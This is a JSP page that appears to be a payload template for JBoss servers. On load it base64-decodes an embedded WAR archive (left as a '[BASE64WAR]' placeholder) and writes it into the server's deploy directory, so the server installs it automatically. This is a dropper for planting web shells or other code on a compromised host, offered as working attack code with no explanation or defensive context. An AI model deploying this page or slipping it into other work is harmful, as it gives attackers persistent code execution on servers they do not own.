<%@ page import="java.util.*,java.io.*, sun.misc.BASE64Decoder"%>

<HTML>
    <BODY>	
		<%	
			
			try {
				String wardata = "[BASE64WAR]";
				BASE64Decoder decoder = new BASE64Decoder();
				byte[] decoded_wardata = decoder.decodeBuffer(wardata);
				String jboss_server_dir = System.getProperty("jboss.server.base.dir");
				String jboss_server_name = System.getProperty("jboss.server.name");
				String war_file = jboss_server_dir + "/" +  jboss_server_name + "/deploy/[WARFILENAME]";
				FileOutputStream fstream = new FileOutputStream(war_file);
				fstream.write(decoded_wardata);
				fstream.close();
				out.println("WAR file deployed successfully on " + war_file);
			}
			catch(Exception e){
				out.println("Failed to deploy WAR");
                out.println(e);
			}
		%>
	</BODY>
</HTML>
